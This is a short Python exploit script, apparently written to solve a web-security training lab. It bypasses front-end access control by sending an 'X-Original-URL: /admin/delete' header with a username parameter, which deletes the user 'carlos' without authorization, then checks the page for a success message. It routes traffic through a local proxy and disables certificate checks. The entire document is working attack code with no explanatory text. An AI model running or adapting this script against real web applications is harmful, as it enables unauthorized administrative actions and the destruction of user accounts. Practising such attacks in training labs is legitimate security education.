import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import re

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080' }

def delete_user(s, url):
    delete_carlos_url = url + '/?username=carlos'
    headers = {"X-Original-URL": "/admin/delete"}
    r = s.get(delete_carlos_url, headers= headers, verify=False, proxies=proxies)

    r = s.get(url,  verify=False, proxies=proxies)
    res = r.text
    if "Congratulations" in res :
         print("[+] Carlos Delete Completed")
    else:
         print("[-] Carlos Delete Error")




if __name__ == "__main__":
    if len(sys.argv) !=2:
          print("(+) usage %s <url>" %sys.argv[0])
          print("(+) Example Url  %s www.example.com " %sys.argv[0])
          sys.exit(-1)
    
    url = sys.argv[1]
    s = requests.Session()
    print("[+] Admin panel arıyorum.......")
    delete_user(s, url)
